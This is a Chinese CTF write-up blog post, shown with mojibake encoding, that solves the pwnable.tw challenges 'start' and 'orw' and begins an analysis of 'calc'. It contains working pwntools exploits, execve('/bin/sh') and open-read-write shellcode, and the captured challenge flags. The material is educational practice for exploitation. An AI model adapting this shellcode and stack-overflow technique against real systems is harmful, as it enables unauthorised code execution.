    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><a href="https://pwnable.tw/">pwnable.tw</a>æ˜¯ä¸€ä¸ªä¸–ç•ŒèŒƒå›´å†…å¾ˆæœ‰åçš„pwné¢˜ç½‘ç«™ï¼Œä½œä¸ºä¸»æ”»pwnçš„CTFerï¼Œä¸Šé¢çš„é¢˜å¯¹æˆ‘è€Œè¨€è‡ªç„¶æ˜¯å¾ˆæœ‰å¿…è¦åšçš„ï¼ˆå½“ç„¶æˆ‘ç°åœ¨è¿˜å¤ªå¼±äº†XD</p><p>ç‚¹å¼€æŸ¥çœ‹é¢˜è§£ğŸ‘‡ï¼ˆ<del>å½“ç„¶ä¹Ÿæœ‰å¯èƒ½æˆ‘æš‚æ—¶è¿˜ä¸€é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥2333</del></p><blockquote><p>æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½</p></blockquote><span id="more"></span><h1 id="0x01-start"><a href="#0x01-start" class="headerlink" title="0x01.start"></a>0x01.start</h1><blockquote><p> nc chall.pwnable.tw 10000</p></blockquote><p><a href="/download/pwnabletw/start" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-start</a> </p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°ä¿æŠ¤å…¨å…³ï¼Œæš—ç¤ºå¯ä»¥ä¸ºæ‰€æ¬²ä¸º23333</p><p><img src="https://i.loli.net/2020/08/17/fFU9jXJR4NlxuGB.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œ<del>ç›´æ¥å‚»çœ¼ï¼Œè¿™éƒ½ä»€ä¹ˆä¸œè¥¿</del>ï¼Œæ•´ä¸ªç¨‹åºåªæœ‰ä¸€ä¸ª<code>_start</code>å‡½æ•°å’Œä¸€ä¸ª<code>_exit</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/08/17/IGXgV5kZ1u3AL4E.png" alt="image.png"></p><p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œè¯¥ç¨‹åºé¦–å…ˆå°†<code>espçš„å€¼</code>ã€<code>_exitå‡½æ•°çš„åœ°å€</code>ä»¥åŠä¸€ä¸²å­—ç¬¦ä¸²<code>let&#39;s start the CTF</code>å‹å…¥æ ˆä¸­</p><p>éšåå°†espçš„å€¼ä¼ å…¥ecxå¯„å­˜å™¨ä¸­ï¼Œå°†0x14ä¼ å…¥dlå¯„å­˜å™¨ä¸­ï¼Œ1ä¼ å…¥blå¯„å­˜å™¨ä¸­ï¼Œ4ä¼ å…¥alå¯„å­˜å™¨ä¸­</p><p><strong>ä¹‹å<code>int 0x80</code>ä¸­æ–­æŒ‡ä»¤è§¦å‘Linuxç³»ç»Ÿè°ƒç”¨ï¼Œalå¯„å­˜å™¨çš„å€¼ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨äº†0x80ä¸­æ–­çš„ç³»ç»Ÿå‡½æ•°<code>sys_write()</code>ï¼Œå°†blã€dlã€ecxçš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¾“å‡ºå­—ç¬¦ä¸²</strong></p><p><strong>éšåå°†0x3cä¼ å…¥dlå¯„å­˜å™¨ä¸­ï¼Œ3ä¼ å…¥alå¯„å­˜å™¨ä¸­ï¼Œä¹‹å<code>int 0x80</code>ä¸­æ–­æŒ‡ä»¤è§¦å‘Linuxç³»ç»Ÿè°ƒç”¨ï¼Œalå¯„å­˜å™¨çš„å€¼ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨äº†0x80ä¸­æ–­çš„ç³»ç»Ÿå‡½æ•°<code>sys_read()</code>ï¼Œå°†blã€dlã€ecxçš„å€¼ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè¯»å…¥æœ€å¤§0x3cä¸ªå­—èŠ‚</strong></p><p>æœ€åè¿”å›åˆ°<code>_exit</code>å‡½æ•°ï¼Œé€€å‡ºç¨‹åº</p><blockquote><p>å‚è§ï¼š<a href="http://asm.sourceforge.net/syscall.html">linuxç³»ç»Ÿè°ƒç”¨</a></p></blockquote><p><img src="https://i.loli.net/2020/08/17/ylLunQ8gIZpUVY9.png" alt="image.png"></p><p>é‚£ä¹ˆåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ï¼Œ**<code>espä¸æ ˆ</code>çš„å˜åŒ–å¦‚ä¸‹**ï¼ˆå­—ä¸‘å‹¿æ€ª2333ï¼ˆå›¾ä¸Šåº”è¯¥æ˜¯5æ¬¡pushï¼Œæ‰‹å¿«å†™é”™äº†XDDD</p><p><img src="https://i.loli.net/2020/08/17/lKcY7N8LV2fIB64.png" alt="image.png"></p><p>é€šè¿‡ä½¿ç”¨ä¸­æ–­çš„æ–¹å¼è°ƒç”¨ç³»ç»Ÿå‡½æ•°ï¼Œæˆ‘ä»¬ä¸éš¾çŒœçš„å‡ºè¿™åº”è¯¥æ˜¯ä¸€ä¸ªçº¯æ±‡ç¼–å†™çš„ç¨‹åº</p><p>ç¨‹åºæœ¬èº«ä¹Ÿæ²¡æœ‰å…¶ä»–å¤šä½™çš„gadgetsï¼Œåœ¨ä¿æŠ¤å…¨å…³çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘<strong>æ³„éœ²espçš„å€¼ï¼Œå°†shellcodeè¾“å…¥åˆ°æ ˆä¸Šï¼Œå†æ§åˆ¶ç¨‹åºè·³è½¬åˆ°æ ˆä¸Šçš„shellcodeä»¥getshell</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘å…ˆè¦†ç›–æ‰return addressï¼Œæ§åˆ¶å…¶è·³è½¬è‡³<code>0x8048087</code>ï¼Œé‡æ–°è°ƒç”¨<code>sys_write()</code>è¾“å‡ºæ ˆä¸Šçš„å†…å®¹ï¼Œæ­¤æ—¶ç¨‹åºä¼šå°†<code>åŸespçš„å€¼</code>è¾“å‡ºå‡ºæ¥</p><p><img src="https://i.loli.net/2020/08/17/H6XJh48wE2bnMeT.png" alt="image.png"></p><p>éšåç¨‹åºæ¥ç€å¾€ä¸‹èµ°ï¼Œé‡æ–°è°ƒç”¨<code>sys_read()</code>ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨è¿™é‡Œè¾“å…¥æˆ‘ä»¬çš„ç¬¬äºŒæ®µpayloadï¼š<em><em>20</em>â€˜Aâ€™ + é€šè¿‡æ³„éœ²çš„espçš„å€¼è®¡ç®—å‡ºæ¥çš„å­˜æ”¾shellcodeçš„æ ˆåœ°å€ + shellcode</em>*ï¼Œè¿™æ®µpayloadç”¨ä»¥getshell</p><p><img src="https://i.loli.net/2020/08/17/H52G6MoufiUagpy.png" alt="image.png"></p><p>ç®€å•åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“ç»è¿‡ç¬¬ä¸€æ¬¡è¾“å…¥åçš„è·³è½¬å†ç»è¿‡ç¬¬äºŒæ¬¡è¾“å…¥åï¼Œæ ˆä¸Š<code>åŸesp+0x14-4</code>çš„ä½ç½®å³æ˜¯ç¨‹åºæ§åˆ¶çš„è¿”å›åœ°å€ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ­¤å¤„å†™ä¸Š<code>åŸesp+0x14</code>ï¼Œç´§æ¥ç€åé¢è·Ÿç€è¦†ç›–ä¸Šæˆ‘ä»¬çš„shellcodeå³å¯getshellï¼Œæ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹å›¾</p><p><img src="https://i.loli.net/2020/08/17/PYJNSMt7j8VF3ob.png" alt="image.png"></p><p>å› ä¸ºè¾“å…¥åªæœ‰60ä¸ªå­—èŠ‚ï¼Œæ•…è€ƒè™‘ä½¿ç”¨11å·ä¸­æ–­è°ƒç”¨execve(â€œ&#x2F;bin&#x2F;shâ€)æ¥getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;!c</span><br><span class="line">;execve (&quot;/bin/sh&quot;) </span><br><span class="line">xor ecx, ecx</span><br><span class="line">mul ecx</span><br><span class="line">push ecx</span><br><span class="line">push 0x68732f2f   ;; hs//</span><br><span class="line">push 0x6e69622f   ;; nib/</span><br><span class="line">mov ebx, esp</span><br><span class="line">mov al, 11</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>æ„é€ shellcodeå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ€åå¾—åˆ°çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">write_addr = <span class="number">0x8048087</span></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./start&#x27;</span>)<span class="comment">#p = remote(&#x27;chall.pwnable.tw&#x27;,10000)</span></span><br><span class="line">payload1 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(write_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">esp_value = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">payload2 = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(esp_value+<span class="number">0x14</span>) + shellcode<span class="comment">#æœ¬åœ°ä¸æ˜åŸå› ä¸€ç›´è·‘ä¸é€šx</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿æ¥ï¼Œå‘é€æˆ‘ä»¬çš„payloadï¼ŒæˆåŠŸå¾—åˆ°flagï¼ˆğŸ‘ˆå› ä¸ºç½‘ä¸å¥½è¿ç€è¯•äº†å¥½å‡ æ¬¡æ‰æˆåŠŸâ€¦</p><p><img src="https://i.loli.net/2020/08/18/rY8vSGaO2R7Zu1W.png" alt="image.png"></p><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-orw"><a href="#0x02-orw" class="headerlink" title="0x02.orw"></a>0x02.orw</h1><blockquote><p>nc chall.pwnable.tw 10001</p></blockquote><p><a href="/download/pwnabletw/orw/orw" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-orw</a> </p><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°é¢˜ç›®å¯¹ç¯å¢ƒåšå‡ºäº†ä¸€å®šçš„é™åˆ¶</p><p><img src="https://i.loli.net/2020/08/31/39DbCjwxMeYLKry.png" alt="image.png"></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†<code>canary</code></p><p><img src="https://i.loli.net/2020/08/31/pHOQYVeolKvJkxD.png" alt="D_V73A_Y0XS1HEU~_CXRZSH.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/08/31/ZtL23IAugR61TzU.png" alt="image.png"></p><p>ä¸»ç¨‹åºä¸€å¼€å§‹ä¼šå…ˆè°ƒç”¨<code>orw_seccomp()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç‚¹è¿›å»åº·åº·</p><p><img src="https://i.loli.net/2020/08/31/nlyewbocGB6zOrv.png" alt="image.png"></p><p>v4æ˜¯canaryçš„å€¼ï¼Œæˆ‘ä»¬ç°åœ¨è¿˜ä¸çŸ¥é“æ˜¯å¦éœ€è¦ç»•è¿‡canaryï¼Œæ•…å…ˆä¸äºˆç†ä¼š</p><p>æ¥ä¸‹æ¥è°ƒç”¨äº†<code>qmemcpy()</code>å‡½æ•°ï¼Œå®é™…ä¸Šå°±æ˜¯<code>memcpy</code>å‡½æ•°ï¼Œå°†ä»0x8048640åœ°å€å¼€å§‹æ‹·è´0x60å­—èŠ‚çš„æ•°æ®åˆ°v3ä¸­ï¼Œéšåèµ‹å€¼12ç»™v1ï¼Œv2ä½œä¸ºæŒ‡é’ˆè·å–v3çš„é¦–å­—èŠ‚åœ°å€</p><p>æœ€åè°ƒç”¨<code>prctl()</code>å‡½æ•°ï¼Œç»“åˆé¢˜ç›®çš„è¯´æ˜ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥çŒœæµ‹åˆ°<code>orw_seccomp()</code>å‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯<strong>ç¦ç”¨å…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…å¼€æ”¾sys_readã€sys_writeã€sys_open</strong></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬<strong>æ— æ³•é€šè¿‡sys_execveæ¥getshell</strong></p><p>æ¥ä¸‹æ¥å›åˆ°ä¸»å‡½æ•°ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å‡ºè¯¥ç¨‹åºä¼šè¯»å…¥æœ€å¤§0xC8å­—èŠ‚è¾“å…¥å¹¶å°è¯•æ‰§è¡Œè¯¥è¾“å…¥</p><p>ç»“åˆé¢˜ç›®è¯´æ˜ï¼Œæˆ‘ä»¬<strong>ä»…è€ƒè™‘æ„é€ shellcodeæ¥cat flag</strong></p><p>ï¼ˆå› ä¸ºè¦ç»•è¿‡seccompæ¥getshellå·²ç»æ˜¯kernel pwn çš„çº§åˆ«leï¼Œ233333ï¼‰</p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">shellcode = &quot;&quot;</span><br><span class="line">shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#x27;esp&#x27;)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#x27;eax&#x27;, &#x27;esp&#x27;, 0x30)</span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#x27;esp&#x27;, 0x30)</span><br><span class="line">p = remote(&#x27;chall.pwnable.tw&#x27;,10001)</span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘æœåŠ¡å™¨å‘é€æˆ‘ä»¬çš„payload</p><p><img src="https://i.loli.net/2020/08/31/m6YRSEpJFk9wQCb.png" alt="_7__O90_E_I39_HGTFIP__S.png"></p><p>æˆåŠŸå¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;sh3llc0ding_w1th_op3n_r34d_writ3&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-CVE-2018-1160ï¼ˆÃ—ï¼‰"><a href="#0x03-CVE-2018-1160ï¼ˆÃ—ï¼‰" class="headerlink" title="0x03.CVE-2018-1160ï¼ˆÃ—ï¼‰"></a>0x03.CVE-2018-1160ï¼ˆÃ—ï¼‰</h1><blockquote><p>nc chall.pwnable.tw 10002</p></blockquote><p><a href="/download/pwnabletw/CVE-2018-1160/netatalk.tgz" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-netatalk.tgz</a> </p><p><a href="/download/pwnabletw/CVE-2018-1160/libc.so" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-libc.so</a> </p><blockquote><p>é¦–å…ˆæˆ‘ä»¬å…ˆçœ‹çœ‹CVEæ˜¯ä¸ªå•¥ï¼š</p><p> CVE çš„è‹±æ–‡å…¨ç§°æ˜¯â€œCommon Vulnerabilities &amp; Exposuresâ€é€šç”¨æ¼æ´æŠ«éœ²ã€‚CVEå°±å¥½åƒæ˜¯ä¸€ä¸ªå­—å…¸è¡¨ï¼Œä¸ºå¹¿æ³›è®¤åŒçš„<a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/339810">ä¿¡æ¯å®‰å…¨</a>æ¼æ´æˆ–è€…å·²ç»æš´éœ²å‡ºæ¥çš„å¼±ç‚¹ç»™å‡ºä¸€ä¸ªå…¬å…±çš„<a href="https://baike.baidu.com/item/%E5%90%8D%E7%A7%B0/6546057">åç§°</a>ã€‚ä½¿ç”¨ä¸€ä¸ªå…±åŒçš„åå­—ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·åœ¨å„è‡ªç‹¬ç«‹çš„å„ç§æ¼æ´æ•°æ®åº“ä¸­å’Œæ¼æ´è¯„ä¼°<a href="https://baike.baidu.com/item/%E5%B7%A5%E5%85%B7/81891">å·¥å…·</a>ä¸­å…±äº«æ•°æ®ï¼Œè™½ç„¶è¿™äº›å·¥å…·å¾ˆéš¾æ•´åˆåœ¨ä¸€èµ·ã€‚è¿™æ ·å°±ä½¿å¾—CVEæˆä¸ºäº†å®‰å…¨ä¿¡æ¯å…±äº«çš„â€œ<a href="https://baike.baidu.com/item/%E5%85%B3%E9%94%AE%E5%AD%97/7105697">å…³é”®å­—</a>â€ã€‚å¦‚æœåœ¨ä¸€ä¸ªæ¼æ´æŠ¥å‘Šä¸­<a href="https://baike.baidu.com/item/%E6%8C%87%E6%98%8E/633104">æŒ‡æ˜</a>çš„ä¸€ä¸ªæ¼æ´ï¼Œå¦‚æœæœ‰CVEåç§°ï¼Œä½ å°±å¯ä»¥å¿«é€Ÿåœ°åœ¨ä»»ä½•å…¶å®ƒCVEå…¼å®¹çš„æ•°æ®åº“ä¸­æ‰¾åˆ°ç›¸åº”ä¿®è¡¥çš„ä¿¡æ¯ï¼Œè§£å†³å®‰å…¨<a href="https://baike.baidu.com/item/%E9%97%AE%E9%A2%98/1067365">é—®é¢˜</a>ã€‚ </p><p><a href="https://baike.baidu.com/item/CVE">ç™¾åº¦ç™¾ç§‘-CVE</a></p></blockquote><p>å¥½å®¶ä¼™ï¼Œç¬¬ä¸‰é¢˜ç›´æ¥ä¸Š<strong>CVE</strong>ï¼Œ<del>æˆ‘ç›´æ¥å½“åœºæš´æ¯™åšä¸å‡ºæ¥è·³è¿‡å¹¶è¿›å…¥ä¸‹ä¸€é¢˜</del></p><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œ<strong>ä¿ æŠ¤ å…¨ å¼€</strong>ï¼ˆå™” å™” å’šï¼‰</p><p><img src="https://i.loli.net/2020/08/31/DF5AuyjdxZCQq9J.png" alt="2GP_TSHIRJ_~Z_GD6F_E@WQ.png"></p><p>å°è¯•åŠ¨æ€è°ƒè¯•ï¼Œè¿™è½¯ä»¶å¤ªè¿‡å¤è€ç›´æ¥è·‘ä¸èµ·æ¥ï¼ˆæ‚²ï¼‰</p><p>è¿˜æ˜¯æ‹–å…¥IDAè¿›è¡Œåˆ†æâ‘§</p><blockquote><p>å’•äº†ï¼Œæ‰¾æ—¶é—´æ¥ç€æ›´ï¼ˆæ‰ä¸æ˜¯å› ä¸ºçœ‹ä¸æ‡‚å‡ ç™¾è¡Œçš„mainå‡½æ•°ï¼ˆğŸ‘ˆèœğŸ“ä¸è¯·è‡ªçˆ¬ï¼‰ï¼‰</p></blockquote><h1 id="0x04-calc"><a href="#0x04-calc" class="headerlink" title="0x04.calc"></a>0x04.calc</h1><blockquote><p>nc chall.pwnable.tw 10003</p></blockquote><p><a href="/download/pwnabletw/calc/calc" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-calc</a> </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå¯ä»¥çœ‹åˆ°å¼€äº†canaryä¿æŠ¤å’Œæ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/08/31/KYd5sUBSI8ODAtF.png" alt="image.png"></p><p>è¿è¡Œç¨‹åºæˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªç®€å•çš„è®¡ç®—å™¨ï¼Œé‡åˆ°éæ³•è¾“å…¥ä¼šæŠ¥é”™ã€ç»™å‡ºé”™è¯¯ç»“æœç”šè‡³ç›´æ¥é€€å‡º</p><p><img src="https://i.loli.net/2020/09/01/akJelDmdMbQY7Sx.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/01/bOtr7Lpmfc5iP4T.png" alt="image.png"></p><p>ç»“åˆä¹‹å‰çš„è¿è¡Œç»“æœï¼Œæˆ‘ä»¬å®¹æ˜“çœ‹å‡ºè¯¥ç¨‹åºä¸­æ¯”è¾ƒå…³é”®çš„å°±æ˜¯<code>calc()</code>å‡½æ•°ï¼Œè¿›å»åº·åº·</p><p><img src="https://i.loli.net/2020/09/01/5ntsIupzL7iwby1.png" alt="image.png"></p><p>å¼€å¤´<code>bzero()</code>å‡½æ•°å°†sä¸Šçš„0x400å­—èŠ‚å¤§å°çš„ç©ºé—´å…¨éƒ½ç½®ä¸º0ï¼Œéšåè¿›å…¥<code>get_exp()</code>å‡½æ•°ï¼Œæˆ‘ä»¬å†è·Ÿè¿‡å»åº·åº·</p><p><img src="https://i.loli.net/2020/09/01/cIRm4X3OU7rJFiN.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºè¯¥å‡½æ•°çš„ä½œç”¨ä¾¿æ˜¯ä»è¾“å…¥ä¸­<strong>ä»…è¯»å–åŠ å‡ä¹˜é™¤æ±‚æ¨¡è¿ç®—ç¬¦ä¸å­—ç¬¦0~9</strong>ï¼Œä¸åˆè§„çš„è¾“å…¥éƒ½ä¼šè¢«è·³è¿‡ï¼Œè¯»åˆ°EOFæˆ–æ¢è¡Œç¬¦ä¼šç»ˆæ­¢ï¼ŒåŒæ—¶æœ€å¤§è¯»å…¥a2ä¸ªå­—èŠ‚ï¼Œè¿™äº›è¾“å…¥ä¼šè¢«å†™åˆ°a1ä¸Š</p><p>ä¹Ÿå°±æ˜¯è¯´è¯¥å‡½æ•°çš„ä½œç”¨ä¾¿æ˜¯<strong>è¯»å–æœ€å¤§1024ä¸ªå­—èŠ‚çš„åˆæ³•è¾“å…¥åˆ°sä¸Š</strong>ï¼Œè‹¥ä¸å­˜åœ¨åˆæ³•è¾“å…¥ï¼Œè¿”å›çš„æ•°æ®åˆ™ä¸º0ï¼Œä½¿calcçš„å¾ªç¯ä¸­æ–­ï¼Œç¨‹åºç»“æŸã€‚</p><p>æ¥ä¸‹æ¥æ˜¯<code>init_pool()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/09/01/9d3aRTn4jyFxQsD.png" alt="image.png"></p><p>ä¸éš¾çœ‹å‡ºä½œç”¨æ˜¯å°†a1ï¼ˆcalcå‡½æ•°ä¸­çš„v1ï¼‰ä¸Šçš„100ä¸ªå­—èŠ‚èµ‹å€¼0</p><p>æ¥ä¸‹æ¥å°±æ˜¯æœ€å…³é”®çš„<code>parse_expr()</code>å‡½æ•°äº†ï¼Œå°±æµç¨‹è€Œè¨€æ¼æ´å¾ˆæœ‰å¯èƒ½å°±åœ¨è¿™é‡Œï¼ˆ<del>è¦å‘½çš„æ˜¯è¿™ä¸ªå‡½æ•°å¾ˆtmé•¿ï¼Œä¸ç¦æ„Ÿæ…¨pwnå¯¹é€†å‘åŸºç¡€çš„è¦æ±‚ä¹Ÿä¸ä½</del></p><p><img src="https://i.loli.net/2020/09/01/Keb5UGoVu4628fS.png" alt="image.png"></p><p>ä¸€å¼€å§‹<code>bzero()</code>å°†sä¸Šçš„100ä¸ªå­—èŠ‚ç½®0ï¼Œéšåå¯¹a1ä¸Šçš„å­—ç¬¦ï¼ˆä¹Ÿå°±æ˜¯å…ˆå‰è¯»å…¥çš„åˆæ³•çš„è¡¨è¾¾å¼ï¼‰é€å­—ç¬¦è¿›è¡Œåˆ¤æ–­</p><p><img src="https://i.loli.net/2020/09/01/EC2X13BPOx9Lcme.png" alt="image.png"></p><p>éšåï¼Œ<strong>é¦–å…ˆåˆ¤æ–­æ˜¯å¦ä¸º+-*&#x2F;%<strong>ç­‰è¿ç®—ç¬¦å·ï¼Œå› ä¸ºå¼ºåˆ¶ç±»å‹è½¬æ¢å°†a1+iä¸Šçš„å€¼è½¬ä¸º</strong>unsigned int</strong>ï¼Œè‹¥æ˜¯â€™0â€™~â€™9â€™åˆ™è‚¯å®šä¼šâ‰¤9ï¼Œ<strong>è‹¥æ˜¯è¿ç®—ç¬¦å·ï¼Œå…¶å‡å»48æ‰€å¾—çš„å€¼å°äº0ï¼Œå¼ºåˆ¶ç±»å‹è½¬æ¢å˜æˆunsigned intåä¼šå˜æˆä¸€ä¸ªæå¤§çš„æ­£æ•´æ•°ï¼ˆå¿…å®šå¤§äº9ï¼‰</strong></p><blockquote><p>æ³¨ï¼šè¿™ä¸ªè¯­å¥æˆ‘æ›¾ç»ä¸€ç›´ä»¥ä¸ºæ˜¯åºŸè¯­å¥Or2</p></blockquote><p><img src="https://i.loli.net/2020/09/01/vb3EIsGjnUu2xOp.png" alt="image.png"></p><p>éšåå°†è¯¥å­—ç¬¦å‰é¢çš„<code>i+a1-v5</code>ä¸ªå­—ç¬¦ï¼ˆv5ç”¨ä½œå¯ç§»åŠ¨ç´¢å¼•ï¼‰ç”¨memcpyæ‹·è´è‡³s1ä¸­ï¼Œæœ«å°¾ç½®â€™\0â€™æˆä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶åˆ¤æ–­s1æ˜¯å¦ä¸ºâ€0â€ï¼Œè‹¥ä¸º0åˆ™é€€å‡ºè¿ç®—</p><p><img src="https://i.loli.net/2020/09/01/Foe2MG9vdKczHY4.png" alt="image.png"></p><p>éšåä½¿ç”¨atoiå°†s1è½¬ä¸ºæ•´æ•°å­˜å…¥v9ä¸­ï¼Œè‹¥v9ä¸ä¸º0ï¼Œåˆ™å°†<em>a2[0]+1èµ‹ç»™v4ï¼Œéšåå°†v9èµ‹ç»™a2[v4+1]ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥çŸ¥é“*<em>a[0]ä¿å­˜çš„æ˜¯å·²ç»å‚¨å­˜çš„æ•°å­—çš„ä¸ªæ•°</em></em></p><p>æ¥ä¸‹æ¥åˆ¤æ–­æˆ‘ä»¬å…ˆå‰åˆ¤æ–­çš„é‚£ä¸€ä¸ªè¿ç®—ç¬¦å­—ç¬¦çš„ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¦å­˜åœ¨ä¸”æ˜¯å¦ä¸ä¸ºè¿ç®—ç¬¦ï¼ˆå³æ˜¯å¦ä¼šå‡ºç°++è¿™æ ·çš„æƒ…å†µï¼‰ï¼Œè‹¥æ˜¯åˆ™ç›´æ¥é€€å‡ºè¿ç®—</p><p><img src="https://i.loli.net/2020/09/01/9jGflRnkt2e67JL.png" 